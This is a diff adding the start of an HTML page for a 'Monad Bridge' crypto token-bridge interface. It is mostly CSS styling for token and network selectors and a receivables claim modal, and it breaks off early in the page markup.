@@ -1,0 +1,1784 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Monad Bridge</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+  :root {
+    --bg-light: #E8E5F5;
+    --bg-dark: #1a1625;
+    --card-light: rgba(255, 255, 255, 0.5);
+    --card-dark: rgba(30, 25, 45, 0.6);
+    --section-light: #F8F7FB;
+    --section-dark: #252030;
+    --text-light: #4A4A4A;
+    --text-dark: #E0E0E0;
+    --muted-light: #9B9B9B;
+    --muted-dark: #808080;
+    --purple: #6C5CE7;
+    --purple-hover: #5B4DD6;
+    --green: #00D26A;
+    --red: #FF4D4D;
+    --orange: #FF9500;
+    --blue: #2D5BFF;
+  }
+  
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
+  
+  body {
+    font-family: 'Inter', sans-serif;
+    min-height: 100vh;
+    background: var(--bg-light);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: background 0.3s ease;
+    position: relative;
+    overflow-x: hidden;
+    padding: 20px;
+  }
+  
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: url('images/background-gradient-light.svg') center/cover no-repeat fixed;
+    pointer-events: none;
+    z-index: 0;
+  }
+  
+  body.dark {
+    background: var(--bg-dark);
+  }
+  
+  body.dark::before {
+    opacity: 0.4;
+  }
+
+  /* Main layout container */
+  .main-wrapper {
+    width: 100%;
+    max-width: 440px;
+    margin: 0 auto;
+    position: relative;
+    z-index: 1;
+  }
+
+  /* Logo */
+  .logo {
+    position: fixed;
+    top: 24px;
+    left: 24px;
+    z-index: 100;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+  
+  .logo-icon {
+    width: 32px;
+    height: 32px;
+  }
+  
+  .logo-text {
+    font-size: 20px;
+    font-weight: 700;
+    color: var(--text-light);
+    letter-spacing: -0.5px;
+    transition: color 0.3s ease;
+  }
+  
+  body.dark .logo-text {
+    color: var(--text-dark);
+  }
+
+  /* Theme Toggle */
+  #themeToggle {
+    position: fixed;
+    top: 24px;
+    right: 24px;
+    width: 44px;
+    height: 44px;
+    border: none;
+    background: transparent;
+    cursor: pointer;
+    z-index: 100;
+    display: grid;
+    place-items: center;
+    transition: transform 0.2s ease;
+  }
+  
+  #themeToggle:hover {
+    transform: scale(1.1);
+  }
+  
+  #themeToggle svg {
+    width: 24px;
+    height: 24px;
+    stroke: var(--text-light);
+    transition: stroke 0.3s ease;
+  }
+  
+  body.dark #themeToggle svg {
+    stroke: var(--text-dark);
+  }
+
+  /* Main Card */
+  .card {
+    width: 100%;
+    background: var(--card-light);
+    backdrop-filter: blur(40px);
+    border-radius: 24px;
+    padding: 32px 28px;
+    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.08);
+    margin-bottom: 80px;
+    transition: background 0.3s ease;
+  }
+  
+  body.dark .card {
+    background: var(--card-dark);
+    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
+  }
+
+  /* Header */
+  .header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 28px;
+  }
+  
+  .header .title {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    color: #374151;
+    font-weight: 600;
+    font-size: 22px;
+  }
+  
+  body.dark .header .title {
+    color: #fff;
+  }
+  
+  .bridge-icon {
+    width: 30px;
+    height: 18px;
+    display: inline-block;
+    vertical-align: middle;
+  }
+  
+  /* Document Icon */
+  .menu-icon {
+    width: 45px;
+    height: 45px;
+    border-radius: 80%;
+    background: rgba(255, 255, 255, 0.5);
+    display: grid;
+    place-items: center;
+    transition: background 0.3s ease;
+    cursor: pointer;
+  }
+  
+  body.dark .menu-icon {
+    background: rgba(255, 255, 255, 0.1);
+  }
+  
+  .doc-icon {
+    width: 40px;
+    height: 40px;
+  }
+  
+  .doc-icon circle {
+    fill: none;
+    stroke: #6b7280;
+    stroke-width: 2;
+    transition: stroke 0.3s;
+  }
+  
+  .doc-icon path {
+    fill: none;
+    stroke: #6b7280;
+    stroke-width: 2;
+    stroke-linecap: round;
+    stroke-linejoin: round;
+    transition: stroke 0.3s;
+  }
+  
+  body.dark .doc-icon circle,
+  body.dark .doc-icon path {
+    stroke: #ffffff;
+  }
+
+  /* Section */
+  .section {
+    background: var(--section-light);
+    border-radius: 16px;
+    padding: 18px 20px;
+    margin-bottom: 16px;
+    transition: background 0.3s ease;
+  }
+  
+  body.dark .section {
+    background: var(--section-dark);
+  }
+  
+  .sec-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 16px;
+  }
+  
+  .sec-label {
+    font-size: 11px;
+    font-weight: 600;
+    letter-spacing: 0.8px;
+    color: var(--muted-light);
+    transition: color 0.3s ease;
+  }
+  
+  body.dark .sec-label {
+    color: var(--muted-dark);
+  }
+  
+  .status {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    font-size: 11px;
+    font-weight: 500;
+    color: var(--muted-light);
+    transition: color 0.3s ease;
+  }
+  
+  body.dark .status {
+    color: var(--muted-dark);
+  }
+  
+  .status svg {
+    width: 20px;
+    height: 20px;
+  }
+  
+  /* Wallet Icon for NOT CONNECTED */
+  .wallet-icon {
+    width: 14px;
+    height: 14px;
+  }
+  
+  .wallet-icon rect,
+  .wallet-icon path,
+  .wallet-icon circle {
+    transition: all 0.3s ease;
+  }
+  
+  .wallet-icon rect,
+  .wallet-icon path {
+    stroke: var(--muted-light);
+    stroke-width: 1.5;
+    fill: none;
+  }
+  
+  .wallet-icon circle {
+    fill: var(--muted-light);
+  }
+  
+  body.dark .wallet-icon rect,
+  body.dark .wallet-icon path {
+    stroke: var(--muted-dark);
+  }
+  
+  body.dark .wallet-icon circle {
+    fill: var(--muted-dark);
+  }
+  
+  .sec-content {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+
+  /* Token Button */
+  .token-btn {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    padding: 8px 18px 8px 8px;
+    background: white;
+    border: 1px solid rgba(0, 0, 0, 0.06);
+    border-radius: 50px;
+    font-size: 14px;
+    font-weight: 500;
+    color: var(--text-light);
+    cursor: pointer;
+    transition: all 0.15s ease;
+    min-width: 120px;
+    justify-content: flex-start;
+  }
+  
+  body.dark .token-btn {
+    background: rgba(255, 255, 255, 0.08);
+    border: 1px solid rgba(255, 255, 255, 0.1);
+    color: var(--text-dark);
+  }
+  
+  .token-btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+  }
+  
+  .token-icon {
+    width: 36px;
+    height: 36px;
+    border-radius: 50%;
+    background: #F0F0F0;
+    display: grid;
+    place-items: center;
+    flex-shrink: 0;
+    position: relative;
+    transition: background 0.3s ease;
+    overflow: visible;
+  }
+  
+  body.dark .token-icon {
+    background: rgba(255, 255, 255, 0.05);
+  }
+  
+  .token-icon img {
+    width: 20px;
+    height: 20px;
+    object-fit: contain;
+  }
+  
+  .token-icon svg {
+    width: 18px;
+    height: 18px;
+    stroke: var(--muted-light);
+    transition: stroke 0.3s ease;
+  }
+  
+  body.dark .token-icon svg {
+    stroke: var(--muted-dark);
+  }
+
+  /* Chain indicator on token icon */
+  .chain-badge {
+    position: absolute;
+    bottom: -2px;
+    right: -2px;
+    width: 16px;
+    height: 16px;
+    border-radius: 50%;
+    background: white;
+    border: 2px solid var(--bg-light);
+    display: grid;
+    place-items: center;
+  }
+  
+  body.dark .chain-badge {
+    background: var(--bg-dark);
+    border-color: var(--bg-dark);
+  }
+  
+  .chain-badge img {
+    width: 10px;
+    height: 10px;
+    border-radius: 50%;
+  }
+
+  /* Amount Input */
+  .amount-input {
+    font-size: 28px;
+    font-weight: 300;
+    color: var(--text-light);
+    background: transparent;
+    border: none;
+    outline: none;
+    text-align: right;
+    width: 100%;
+    max-width: 150px;
+    transition: color 0.3s ease;
+  }
+  
+  body.dark .amount-input {
+    color: var(--text-dark);
+  }
+  
+  .amount-input::placeholder {
+    opacity: 0.35;
+  }
+
+  /* Price Display */
+  .price-display {
+    font-size: 12px;
+    color: var(--muted-light);
+    margin-top: 4px;
+    text-align: right;
+    transition: color 0.3s ease;
+  }
+  
+  body.dark .price-display {
+    color: var(--muted-dark);
+  }
+  
+  .price-change {
+    font-size: 11px;
+    margin-left: 6px;
+    font-weight: 600;
+  }
+  
+  .price-change.positive {
+    color: var(--green);
+  }
+  
+  .price-change.negative {
+    color: var(--red);
+  }
+
+  /* Swap Icon */
+  .swap-icon-container {
+    position: relative;
+    margin: -10px 0;
+    z-index: 10;
+    display: flex;
+    justify-content: center;
+  }
+  
+  .swap-icon {
+    width: 40px;
+    height: 40px;
+    border-radius: 50%;
+    background: white;
+    border: 3px solid var(--section-light);
+    display: grid;
+    place-items: center;
+    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+    transition: all 0.3s ease;
+    cursor: pointer;
+  }
+  
+  body.dark .swap-icon {
+    background: var(--section-dark);
+    border-color: var(--bg-dark);
+  }
+  
+  .swap-icon:hover {
+    transform: scale(1.1);
+  }
+  
+  .swap-icon svg {
+    width: 16px;
+    height: 16px;
+    stroke: var(--purple);
+    stroke-width: 2;
+  }
+
+  /* Connect Button */
+  .connect-btn {
+    width: 100%;
+    padding: 16px;
+    border: none;
+    border-radius: 50px;
+    background: var(--purple);
+    color: white;
+    font-size: 12px;
+    font-weight: 700;
+    letter-spacing: 1.2px;
+    text-transform: uppercase;
+    cursor: pointer;
+    transition: all 0.2s ease;
+    margin-top: 12px;
+  }
+  
+  .connect-btn:hover {
+    background: var(--purple-hover);
+    transform: translateY(-2px);
+    box-shadow: 0 8px 20px rgba(108, 92, 231, 0.3);
+  }
+
+  /* Token Modal */
+  #tokenModal {
+    position: fixed;
+    inset: 0;
+    z-index: 9999;
+    display: none;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+  
+  .modal-backdrop {
+    position: absolute;
+    inset: 0;
+    background: rgba(0, 0, 0, 0.5);
+    backdrop-filter: blur(8px);
+  }
+  
+  .modal-content {
+    position: relative;
+    width: min(100%, 460px);
+    max-height: 90vh;
+    background: white;
+    border-radius: 24px;
+    overflow: hidden;
+    box-shadow: 0 30px 80px rgba(0, 0, 0, 0.3);
+    transition: background 0.3s ease;
+  }
+  
+  body.dark .modal-content {
+    background: var(--card-dark);
+  }
+  
+  .modal-header {
+    padding: 24px 24px 20px;
+    border-bottom: 1px solid rgba(0, 0, 0, 0.08);
+  }
+  
+  body.dark .modal-header {
+    border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+  }
+  
+  .modal-header h2 {
+    font-size: 20px;
+    font-weight: 700;
+    color: var(--text-light);
+    transition: color 0.3s ease;
+    margin-bottom: 16px;
+  }
+  
+  body.dark .modal-header h2 {
+    color: var(--text-dark);
+  }
+  
+  .close-btn {
+    position: absolute;
+    top: 20px;
+    right: 20px;
+    width: 32px;
+    height: 32px;
+    border: none;
+    background: rgba(0, 0, 0, 0.05);
+    border-radius: 50%;
+    font-size: 24px;
+    color: var(--text-light);
+    cursor: pointer;
+    transition: all 0.2s ease;
+    line-height: 1;
+    display: grid;
+    place-items: center;
+  }
+  
+  body.dark .close-btn {
+    background: rgba(255, 255, 255, 0.1);
+    color: var(--text-dark);
+  }
+  
+  .close-btn:hover {
+    background: rgba(0, 0, 0, 0.1);
+  }
+
+  /* Network Groups */
+  .network-groups {
+    padding: 0 24px 20px;
+  }
+  
+  .network-group {
+    margin-bottom: 24px;
+  }
+  
+  .network-group:last-child {
+    margin-bottom: 16px;
+  }
+  
+  .network-group h3 {
+    font-size: 14px;
+    font-weight: 600;
+    color: var(--text-light);
+    margin-bottom: 16px;
+    transition: color 0.3s ease;
+  }
+  
+  body.dark .network-group h3 {
+    color: var(--text-dark);
+  }
+  
+  .chain-list {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 12px;
+  }
+  
+  .chain-btn {
+    padding: 10px 16px;
+    border-radius: 12px;
+    background: rgba(0, 0, 0, 0.04);
+    border: 1.5px solid transparent;
+    font-size: 14px;
+    font-weight: 500;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    color: var(--text-light);
+    transition: all 0.2s ease;
+    min-width: 100px;
+  }
+  
+  body.dark .chain-btn {
+    background: rgba(255, 255, 255, 0.06);
+    color: var(--text-dark);
+  }
+  
+  .chain-btn img {
+    width: 20px;
+    height: 20px;
+    border-radius: 50%;
+  }
+  
+  .chain-btn i {
+    font-size: 16px;
+  }
+  
+  .chain-btn:hover {
+    border-color: var(--purple);
+    transform: translateY(-2px);
+  }
+  
+  .chain-btn.active {
+    background: var(--purple);
+    color: white;
+    border-color: var(--purple);
+  }
+  
+  .chain-btn.active:hover {
+    background: var(--purple-hover);
+  }
+
+  /* Search Box */
+  .search-box {
+    padding: 0 24px 20px;
+    position: relative;
+  }
+  
+  .search-box input {
+    width: 100%;
+    padding: 12px 50px 12px 18px;
+    border: 1px solid rgba(0, 0, 0, 0.08);
+    border-radius: 50px;
+    background: rgba(0, 0, 0, 0.02);
+    font-size: 14px;
+    outline: none;
+    color: var(--text-light);
+    transition: all 0.2s ease;
+  }
+  
+  body.dark .search-box input {
+    background: rgba(255, 255, 255, 0.05);
+    border-color: rgba(255, 255, 255, 0.1);
+    color: var(--text-dark);
+  }
+  
+  .search-box input::placeholder {
+    color: var(--muted-light);
+  }
+  
+  body.dark .search-box input::placeholder {
+    color: var(--muted-dark);
+  }
+  
+  .search-box input:focus {
+    border-color: var(--purple);
+  }
+  
+  .search-btn {
+    position: absolute;
+    right: 28px;
+    top: 50%;
+    transform: translateY(-50%);
+    width: 32px;
+    height: 32px;
+    border: none;
+    background: var(--purple);
+    border-radius: 50%;
+    color: white;
+    cursor: pointer;
+    display: grid;
+    place-items: center;
+    transition: all 0.2s ease;
+  }
+  
+  .search-btn:hover {
+    background: var(--purple-hover);
+  }
+
+  /* Token List */
+  .token-section {
+    padding: 0 24px 24px;
+    max-height: 400px;
+    overflow-y: auto;
+  }
+  
+  .token-section h3 {
+    font-size: 12px;
+    font-weight: 600;
+    color: var(--muted-light);
+    margin-bottom: 12px;
+    transition: color 0.3s ease;
+  }
+  
+  body.dark .token-section h3 {
+    color: var(--muted-dark);
+  }
+  
+  .token-item {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    padding: 14px 16px;
+    border-radius: 12px;
+    cursor: pointer;
+    transition: background 0.2s ease;
+    border: 1px solid transparent;
+    position: relative;
+  }
+  
+  .token-item:hover {
+    background: rgba(108, 92, 231, 0.08);
+    border-color: rgba(108, 92, 231, 0.1);
+  }
+  
+  .token-icon-container {
+    position: relative;
+    width: 40px;
+    height: 40px;
+  }
+  
+  .token-icon-container img {
+    width: 40px;
+    height: 40px;
+    border-radius: 50%;
+    object-fit: cover;
+  }
+  
+  .token-info {
+    flex: 1;
+  }
+  
+  .token-info h4 {
+    font-size: 15px;
+    font-weight: 600;
+    color: var(--text-light);
+    transition: color 0.3s ease;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+  }
+  
+  body.dark .token-info h4 {
+    color: var(--text-dark);
+  }
+  
+  .token-chain {
+    font-size: 10px;
+    background: rgba(108, 92, 231, 0.1);
+    color: var(--purple);
+    padding: 2px 6px;
+    border-radius: 4px;
+    font-weight: 500;
+  }
+  
+  .token-info p {
+    font-size: 12px;
+    color: var(--muted-light);
+    margin-top: 2px;
+    transition: color 0.3s ease;
+  }
+  
+  body.dark .token-info p {
+    color: var(--muted-dark);
+  }
+  
+  .token-price {
+    text-align: right;
+    font-size: 14px;
+    font-weight: 600;
+    color: var(--text-light);
+    transition: color 0.3s ease;
+  }
+  
+  body.dark .token-price {
+    color: var(--text-dark);
+  }
+  
+  .token-change {
+    font-size: 12px;
+    margin-top: 2px;
+  }
+  
+  .token-change.positive {
+    color: var(--green);
+  }
+  
+  .token-change.negative {
+    color: var(--red);
+  }
+
+  /* Chain badge in token list */
+  .token-chain-badge {
+    position: absolute;
+    bottom: -2px;
+    right: -2px;
+    width: 16px;
+    height: 16px;
+    border-radius: 50%;
+    background: white;
+    border: 2px solid white;
+    display: grid;
+    place-items: center;
+  }
+  
+  body.dark .token-chain-badge {
+    background: var(--section-dark);
+    border-color: var(--section-dark);
+  }
+  
+  .token-chain-badge img {
+    width: 12px;
+    height: 12px;
+    border-radius: 50%;
+  }
+
+  /* Add Network Button */
+  .add-network-btn {
+    padding: 10px 16px;
+    border-radius: 12px;
+    background: rgba(0, 0, 0, 0.04);
+    border: 1.5px dashed rgba(0, 0, 0, 0.2);
+    font-size: 14px;
+    font-weight: 500;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    color: var(--muted-light);
+    transition: all 0.2s ease;
+    min-width: 100px;
+  }
+  
+  body.dark .add-network-btn {
+    background: rgba(255, 255, 255, 0.06);
+    border-color: rgba(255, 255, 255, 0.2);
+    color: var(--muted-dark);
+  }
+  
+  .add-network-btn:hover {
+    border-color: var(--purple);
+    color: var(--purple);
+  }
+
+  /* Loading State */
+  .loading {
+    text-align: center;
+    padding: 20px;
+    color: var(--muted-light);
+    font-size: 14px;
+  }
+  
+  .loading-spinner {
+    width: 20px;
+    height: 20px;
+    border: 2px solid rgba(108, 92, 231, 0.2);
+    border-top-color: var(--purple);
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+    margin: 0 auto 10px;
+  }
+  
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+
+  /* ==============================
+     FOOTER STYLES (UPDATED)
+  ============================== */
+  .footer {
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    padding: 12px 16px;
+    background: rgba(255, 255, 255, 0.8);
+    backdrop-filter: blur(20px);
+    border-top: 1px solid rgba(255, 255, 255, 0.3);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 8px;
+    z-index: 100;
+    transition: background 0.3s ease;
+  }
+  
+  body.dark .footer {
+    background: rgba(20, 20, 30, 0.8);
+    border-top: 1px solid rgba(255, 255, 255, 0.1);
+  }
+  
+  .footer-links {
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    gap: 12px 20px;
+    margin-bottom: 4px;
+  }
+  
+  .footer-links a {
+    font-size: 12px;
+    color: var(--purple);
+    text-decoration: none;
+    font-weight: 500;
+    transition: opacity 0.2s ease;
+    white-space: nowrap;
+  }
+  
+  .footer-links a:hover {
+    opacity: 0.7;
+  }
+  
+  .receivables-btn {
+    font-weight: 600;
+    color: var(--blue) !important;
+  }
+  
+  .footer-bottom {
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    align-items: center;
+    gap: 12px;
+    font-size: 11px;
+    color: var(--muted-light);
+  }
+  
+  .social-links {
+    display: flex;
+    gap: 12px;
+    align-items: center;
+  }
+  
+  .social-links a {
+    width: 24px;
+    height: 24px;
+    display: grid;
+    place-items: center;
+    transition: transform 0.2s ease;
+  }
+  
+  .social-links a:hover {
+    transform: scale(1.1);
+  }
+  
+  .social-links svg {
+    width: 16px;
+    height: 16px;
+    fill: var(--purple);
+    transition: fill 0.3s ease;
+  }
+  
+  body.dark .social-links svg {
+    fill: var(--text-dark);
+  }
+  
+  .powered-by {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    opacity: 0.7;
+  }
+  
+  .powered-by img {
+    height: 14px;
+    width: auto;
+  }
+
+  /* ==============================
+     MONAD RECEIVABLES MODAL
+  ============================== */
+  #receivablesModal {
+    position: fixed;
+    inset: 0;
+    z-index: 9999;
+    display: none;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+  
+  .receivables-content {
+    width: min(100%, 420px);
+    max-height: 85vh;
+    overflow-y: auto;
+  }
+  
+  .modal-body {
+    padding: 24px;
+  }
+  
+  .receivables-info {
+    text-align: center;
+    margin-bottom: 20px;
+  }
+  
+  .receivables-info p {
+    margin-bottom: 8px;
+    color: var(--text-light);
+    font-size: 14px;
+  }
+  
+  body.dark .receivables-info p {
+    color: var(--text-dark);
+  }
+  
+  .evm-warning {
+    color: var(--orange) !important;
+    font-size: 12px;
+    opacity: 0.7;
+    margin-top: 4px;
+  }
+  
+  .address-input-container {
+    display: flex;
+    gap: 10px;
+    margin-bottom: 20px;
+  }
+  
+  .address-input {
+    flex: 1;
+    padding: 12px 16px;
+    border: 1px solid rgba(0, 0, 0, 0.1);
+    border-radius: 12px;
+    font-size: 14px;
+    outline: none;
+    transition: border-color 0.2s;
+    background: rgba(0, 0, 0, 0.02);
+    color: var(--text-light);
+  }
+  
+  body.dark .address-input {
+    background: rgba(255, 255, 255, 0.05);
+    border-color: rgba(255, 255, 255, 0.1);
+    color: var(--text-dark);
+  }
+  
+  .address-input:focus {
+    border-color: var(--purple);
+  }
+  
+  .check-btn {
+    padding: 12px 20px;
+    background: var(--purple);
+    color: white;
+    border: none;
+    border-radius: 12px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: opacity 0.2s;
+    white-space: nowrap;
+  }
+  
+  .check-btn:hover {
+    opacity: 0.9;
+  }
+  
+  .result-container {
+    background: rgba(108, 92, 231, 0.05);
+    border-radius: 16px;
+    padding: 20px;
+    margin: 20px 0;
+    border: 1px solid rgba(108, 92, 231, 0.1);
+    display: none;
+  }
+  
+  .amount-display {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    margin-bottom: 20px;
+  }
+  
+  .amount-display .token-icon {
+    width: 50px;
+    height: 50px;
+    background: rgba(255, 255, 255, 0.1);
+  }
+  
+  .amount-info h3 {
+    font-size: 14px;
+    color: var(--muted-light);
+    margin-bottom: 8px;
+    font-weight: 500;
+  }
+  
+  body.dark .amount-info h3 {
+    color: var(--muted-dark);
+  }
+  
+  .amount-value {
+    display: flex;
+    align-items: baseline;
+    gap: 8px;
+    margin-bottom: 4px;
+  }
+  
+  .amount-value span:first-child {
+    font-size: 28px;
+    font-weight: 700;
+    color: var(--text-light);
+  }
+  
+  body.dark .amount-value span:first-child {
+    color: var(--text-dark);
+  }
+  
+  .token-symbol {
+    font-size: 16px;
+    color: var(--purple);
+    font-weight: 600;
+  }
+  
+  .usd-value {
+    font-size: 14px;
+    color: var(--muted-light);
+  }
+  
+  body.dark .usd-value {
+    color: var(--muted-dark);
+  }
+  
+  .claim-btn {
+    width: 100%;
+    padding: 16px;
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    color: white;
+    border: none;
+    border-radius: 12px;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.2s;
+    margin-bottom: 12px;
+  }
+  
+  .claim-btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 6px 20px rgba(102, 126, 234, 0.4);
+  }
+  
+  .claim-btn:disabled {
+    opacity: 0.5;
+    cursor: not-allowed;
+    transform: none;
+  }
+  
+  .transaction-info {
+    text-align: center;
+    color: var(--muted-light);
+    font-size: 11px;
+    line-height: 1.5;
+  }
+  
+  .error-container {
+    background: rgba(239, 68, 68, 0.1);
+    border: 1px solid rgba(239, 68, 68, 0.2);
+    border-radius: 12px;
+    padding: 16px;
+    margin: 20px 0;
+    text-align: center;
+    display: none;
+  }
+  
+  .error-message {
+    color: #ef4444;
+    margin: 0;
+    font-weight: 500;
+  }
+  
+  .instructions {
+    background: rgba(0, 0, 0, 0.02);
+    border-radius: 12px;
+    padding: 16px;
+    margin-top: 20px;
+  }
+  
+  body.dark .instructions {
+    background: rgba(255, 255, 255, 0.05);
+  }
+  
+  .instructions h4 {
+    margin: 0 0 12px 0;
+    font-size: 14px;
+    color: var(--text-light);
+  }
+  
+  body.dark .instructions h4 {
+    color: var(--text-dark);
+  }
+  
+  .instructions ul {
+    margin: 0;
+    padding-left: 20px;
+  }
+  
+  .instructions li {
+    margin-bottom: 6px;
+    color: var(--muted-light);
+    font-size: 12px;
+  }
+  
+  body.dark .instructions li {
+    color: var(--muted-dark);
+  }
+
+  /* ==============================
+     MOBILE RESPONSIVE STYLES
+  ============================== */
+  @media (max-width: 640px) {
+    body {
+      padding: 16px;
+      align-items: flex-start;
+      min-height: 100vh;
+    }
+    
+    .main-wrapper {
+      max-width: 100%;
+    }
+    
+    .logo {
+      top: 16px;
+      left: 16px;
+    }
+    
+    .logo-text {
+      font-size: 18px;
+    }
+    
+    .logo-icon {
+      width: 28px;
+      height: 28px;
+    }
+    
+    #themeToggle {
+      top: 16px;
+      right: 16px;
+      width: 40px;
+      height: 40px;
+    }
+    
+    .card {
+      padding: 24px 20px;
+      margin-bottom: 100px;
+    }
+    
+    .header .title {
+      font-size: 20px;
+    }
+    
+    .menu-icon {
+      width: 40px;
+      height: 40px;
+    }
+    
+    .section {
+      padding: 16px;
+    }
+    
+    .token-btn {
+      padding: 6px 14px 6px 6px;
+      min-width: 110px;
+    }
+    
+    .token-icon {
+      width: 32px;
+      height: 32px;
+    }
+    
+    .amount-input {
+      font-size: 24px;
+      max-width: 120px;
+    }
+    
+    .swap-icon {
+      width: 36px;
+      height: 36px;
+    }
+    
+    .swap-icon svg {
+      width: 14px;
+      height: 14px;
+    }
+    
+    .connect-btn {
+      padding: 14px;
+      font-size: 11px;
+    }
+    
+    .footer {
+      padding: 10px 12px;
+      gap: 6px;
+    }
+    
+    .footer-links {
+      gap: 10px 16px;
+    }
+    
+    .footer-links a {
+      font-size: 11px;
+    }
+    
+    .footer-bottom {
+      font-size: 10px;
+      gap: 8px;
+    }
+    
+    .social-links a {
+      width: 22px;
+      height: 22px;
+    }
+    
+    .social-links svg {
+      width: 14px;
+      height: 14px;
+    }
+    
+    .powered-by img {
+      height: 12px;
+    }
+    
+    /* Modal adjustments */
+    .modal-content {
+      width: 100%;
+      max-height: 80vh;
+    }
+    
+    .modal-header {
+      padding: 20px 20px 16px;
+    }
+    
+    .modal-header h2 {
+      font-size: 18px;
+    }
+    
+    .close-btn {
+      top: 16px;
+      right: 16px;
+      width: 28px;
+      height: 28px;
+      font-size: 20px;
+    }
+    
+    .network-groups,
+    .search-box,
+    .token-section,
+    .modal-body {
+      padding-left: 20px;
+      padding-right: 20px;
+    }
+    
+    .chain-list {
+      gap: 8px;
+    }
+    
+    .chain-btn,
+    .add-network-btn {
+      padding: 8px 12px;
+      font-size: 12px;
+      min-width: auto;
+      flex: 1;
+      max-width: calc(33.333% - 8px);
+    }
+    
+    .token-item {
+      padding: 12px;
+    }
+    
+    .token-icon-container {
+      width: 36px;
+      height: 36px;
+    }
+    
+    .token-info h4 {
+      font-size: 14px;
+    }
+    
+    .token-info p {
+      font-size: 11px;
+    }
+    
+    .token-price {
+      font-size: 13px;
+    }
+    
+    /* Receivables modal mobile */
+    .address-input-container {
+      flex-direction: column;
+    }
+    
+    .check-btn {
+      width: 100%;
+    }
+    
+    .amount-display {
+      gap: 12px;
+    }
+    
+    .amount-display .token-icon {
+      width: 40px;
+      height: 40px;
+    }
+    
+    .amount-value span:first-child {
+      font-size: 24px;
+    }
+    
+    .token-symbol {
+      font-size: 14px;
+    }
+    
+    .claim-btn {
+      padding: 14px;
+      font-size: 15px;
+    }
+  }
+
+  /* Small phone adjustments */
+  @media (max-width: 380px) {
+    .footer-links {
+      gap: 8px 12px;
+    }
+    
+    .footer-links a {
+      font-size: 10px;
+    }
+    
+    .chain-btn,
+    .add-network-btn {
+      padding: 6px 8px;
+      font-size: 11px;
+      max-width: calc(50% - 8px);
+    }
+    
+    .card {
+      padding: 20px 16px;
+    }
+  }
+</style>
+</head>
+<body>
+
+<!-- Logo -->
+<div class="logo">
+  <img class="logo-icon" src="images/monad_logo.png" alt="Monad">
+  <span class="logo-text">MONAD</span>
+</div>
+
+<!-- Theme Toggle -->
+<button id="themeToggle" aria-label="Toggle theme">
+  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+    <circle cx="12" cy="12" r="5"/>
+    <line x1="12" y1="1" x2="12" y2="3"/>
+    <line x1="12" y1="21" x2="12" y2="23"/>
+    <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/>
+    <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/>
+    <line x1="1" y1="12" x2="3" y2="12"/>
+    <line x1="21" y1="12" x2="23" y2="12"/>
+    <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/>
+    <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/>
+  </svg>
+</button>
+
+<!-- Main Bridge Card -->
+<div class="main-wrapper">
+  <div class="card">
+    <div class="header">
+      <div class="title">
+         <svg class="bridge-icon" width="20" height="8" viewBox="0 0 20 8" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <line x1="0.5" y1="4" x2="8" y2="4" stroke="currentColor" stroke-width="1" stroke-linecap="butt"/>
+        <circle cx="10" cy="4" r="2" stroke="currentColor" stroke-width="1" fill="none"/>
+        <line x1="12" y1="4" x2="19.5" y2="4" stroke="currentColor" stroke-width="1" stroke-linecap="butt"/>
+      </svg>
+        Bridge
+      </div>
+      <div class="menu-icon">
+        <svg class="doc-icon" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+          <circle cx="24" cy="24" r="18"/>
+          <path d="M18 16 h8 l4 4 v10 h-12 z"/>
+          <path d="M26 16 v4 h4"/>
+          <path d="M20 24 h6"/>
+          <path d="M20 27 h6"/>
+        </svg>
+      </div>
+    </div>
+
+    <!-- FROM Section -->
+    <div class="section">
+      <div class="sec-header">
+        <div class="sec-label">FROM</div>
+        <div class="status">
+          NOT CONNECTED
+          <!-- Wallet Icon for NOT CONNECTED -->
